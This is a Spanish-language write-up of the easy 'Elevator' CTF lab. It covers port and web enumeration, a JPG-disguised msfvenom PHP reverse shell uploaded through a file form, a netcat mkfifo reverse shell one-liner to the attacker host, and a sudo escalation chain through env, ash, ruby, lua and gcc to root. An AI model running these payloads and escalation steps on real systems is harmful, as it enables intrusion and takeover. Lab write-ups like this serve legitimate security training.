# ELEVATOR  

> Dificultad: Fácil  									

____

#### FASE ENUMERACIÓN / RECOPILACIÓN:

Primero comenzamos con los escaneos de puertos, servicios y versiones. Utilicé la herramienta nmap:  

`nmap -n -v -sV -sC --min-rate 5000 --open <IP>`  

> 80/tcp open  http    Apache httpd 2.4.62 ((Debian))
	
Luego proseguimos con la enumeración web. Para esto utilicé la herramienta wfuzz:

`wfuzz -c --hc 404 -t 200 -z file,<diccionario> -u "http://<IP_elevator>/FUZZ"`

Encontró 3 directorios interesantes (301 y 200):  

> /javascript		    301  
> /themes		        301  
> /server-status	    403  
> /themes/uploads/	 	200  	

Una vez aclarado que no hay más dirs por encontrar, me enfoqué en la búsqueda de recursos (URI):  

`wfuzz -c --hc 404,403 --hw 0 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt"-u "http://172.18.0.2/themes/FUZZ.FUZ2Z"`  

> /index.html		      200  
> /themes/upload.php	  200  
> /themes/archivo.html    200  

____
		
FASE EXPLOTACIÓN:
-----------------
Al buscar en el navegaor la URI /themes/archivo.html, vemos que se trata de un formulario de subida de archivos. Por lo visto, sólo acepta imágenes JPG o JPEG, por lo cual debemos pensar en subir nuestra web-shell. En mi caso la creé con msfvenom:  

`msfvenom -p php/meterpreter/reverse_tcp LHOST=172.18.0.3 LPORT=6660 R -o webshell.php`  

Usaré ImageMagick para crear una nueva imagen 1x1 para que me reconozca el formato:  

`sudo apt install imagemagick -y`

`convert -size 1x1 xc:red img-inicial.jpg`  

Ahora, concatenamos el código de la web shell a la imagen:

`cat img-inicial.jpg webshell.php > webshell.php.jpg`  

Entonces, dejamos la extensión JPG para poder subir el fichero y PHP para que el servidor ejecute la webshell.  

Vamos al navegador a /themes/archivo.html y la subimos:  

[IMG]  

El navegador devuelve la URI de la imagen maliciosa. En mi caso: http://localhost:9090/themes/uploads/6912508f2631b.jpg  

Ahora preparamos el listener con Meterpreter:  

> msfconole
> use exploit/multi/handler
> set payload /php/meterpreter/reverse_tcp
> set lhost 172.18.0.3
> set lport 6660
> exploit (o run)

Una vez preparado el listener, corremos la webshell y conecta!  

[IMG]  

Desde meterpreter corremos getuid y somos www-data. O tambien:

shell --> whoami

En este punto podríamos pensar en mejorar el entorno de trabajo (TTY) empezando por una Reverse Shell:  

```
nc -lvnp 7770 # Local
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.18.0.3 77700 > /tmp/f # Remoto
```
Al conseguir conectividad, primero hay que mejorar la TTY:

`which python python3`

Al ver que no hay ningún intérprete de Python instalado, probamos esta otra forma más universal:
					
			

FASE POST-EXPLOTACIÓN:
----------------------
	- Persistencia
	- Escalar Privilegios
		- Enumerar usuarios:
			- daphne
			- vilma 
			- shaggy
			- fred  
			- scooby 

		- Buscar credenciales
			- diccionario
			- sistema
		
		- grep -RIiEn "daphne|vilma|shaggy|fred|scooby" / 2>/dev/null 
			- /etc/sudoers.dpkg-old:1:www-data ALL=(daphne) NOPASSWD: /usr/bin/env
		
		- whoami = www-data
		- sudo -l
			- ALL=(daphne) NOPASSWD: /usr/bin/env
		- sudo -u daphne env /bin/sh
			- whoami = daphne
			- sudo -l
				- (vilma) NOPASSWD: /usr/bin/ash
			- sudo -u vilma /usr/bin/ash
				- whoami = vilma
				- sudo -l
					- (shaggy) NOPASSWD: /usr/bin/ruby
				- sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'
					- whoami = shaggy
					- sudo -l
						- (fred) NOPASSWD: /usr/bin/lua
					- sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'
						- whoami = fred
							- sudo -l
								- (scooby) NOPASSWD: /usr/bin/gcc
							- sudo -u scooby /usr/bin/gcc -wrapper /bin/sh,-s .
								- whoami = scooby
								- sudo -l
									- (root) NOPASSWD: /usr/bin/sudo
								- sudo /usr/bin/sudo /bin/sh
									- whoami = root
